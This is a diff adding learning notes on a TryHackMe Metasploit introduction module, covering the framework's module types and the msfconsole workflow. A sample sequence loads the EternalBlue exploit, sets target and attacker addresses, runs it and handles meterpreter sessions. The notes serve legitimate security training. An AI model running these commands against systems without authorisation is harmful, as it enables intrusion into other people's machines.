@@ -832,3 +832,79 @@ The ability to methodically work through cracking Windows and Linux authenticati
 
 **Key Skill Acquired:** A systematic methodology for password cracking across diverse scenarios, from basic hash files to real-world artifacts like stolen credential databases and encrypted sensitive files.
 
+# TryHackMe - Cyber Security 101
+
+## Module Completed: Metasploit: Introduction
+
+**Completion Date:** [2025/09/30]
+**Module Objective:** Introduce the fundamental concepts of the Metasploit penetration framework, its modular architecture, and the basic workflow within `msfconsole`.
+
+### 📚 What I Learned / Key Concepts
+
+This module lays the foundation for using one of the most powerful tools in a cybersecurity professional's toolkit.
+
+#### 1. **Introduction to Metasploit**
+- **What is it?** An **open-source framework** for developing and executing exploits against remote targets. It is the central tool for many phases of a penetration test.
+- **Purpose:** To provide a unified platform for researching, developing, and executing code that exploits security vulnerabilities.
+
+#### 2. **Main Components of Metasploit (Modular Architecture)**
+Metasploit is organized into modules, allowing for great flexibility and code reuse.
+
+| **Component** | **Main Function** |
+| :--- | :--- |
+| **Auxiliary** | Support modules such as scanners, fuzzers, and information gathering tools. They do not execute payloads. |
+| **Encoders** | Transform payloads to evade antivirus software. |
+| **Evasion** | Creates custom executables to evade protection measures on the client. |
+| **Exploits** | Code that takes advantage of a specific vulnerability in software or a system. |
+| **NOPs** | Generators of “No Operation” instructions for exploit stability. |
+| **Payloads** | Code that executes on the target system after a successful exploit (e.g., `meterpreter`, reverse shells). |
+| **Post** | Post-exploitation modules that run once access to a system has been gained. |
+
+#### 3. **Msfconsole: The Heart of Metasploit**
+- **Main Interface:** `msfconsole` is the most powerful and widely used interface within the framework.
+- **Contexts:** It is crucial to understand what context you are in, as it defines the available commands:
+- `msf6 >`: Main prompt.
+- `msf6 exploit(...) >`: Context of a loaded module (where options are configured).
+- `meterpreter >`: Active session on a compromised system.
+
+#### 4. **Working with Modules (Basic Workflow)**
+The lifecycle for using a module in `msfconsole` follows these steps:
+
+1.  **Select a Module:**
+```bash
+    use exploit/windows/smb/ms17_010_eternalblue
+    ```
+
+2.  **Display and Configure Options:**
+```bash
+    show options          # View required and optional parameters.
+    set RHOSTS 10.10.x.x  # Configure the target IP.
+    set LHOST 10.10.y.y   # Configure the attacker IP (for reverse connections).
+    ```
+
+3.  **Global Configuration (Optional):**
+    ```bash
+    setg RHOSTS 10.10.x.x # `setg` sets a value for all modules.
+    ```
+
+4.  **Launch Execution:**
+    ```bash
+    exploit
+    # or
+    run
+    ```
+
+5.  **Manage Sessions:**
+    ```bash
+    sessions              # List active sessions.
+    sessions -i <ID>      # Interact with a specific session.
+    background            # Send a meterpreter session to the background.
+    ```
+
+### 🛠️ **Practical Conclusion**
+Metasploit is no longer an intimidating “black box.” By understanding its modular structure and the basic flow of `msfconsole`, it becomes a systematic and predictable tool for:
+- Checking for vulnerabilities.
+- Automating the exploitation phase.
+- Centrally managing access to multiple compromised systems.
+
+> **Key Skill Acquired:** The ability to navigate the `msfconsole` interface, search for modules relevant to a target, and apply the fundamental flow of `use -> configure -> run` to execute them.
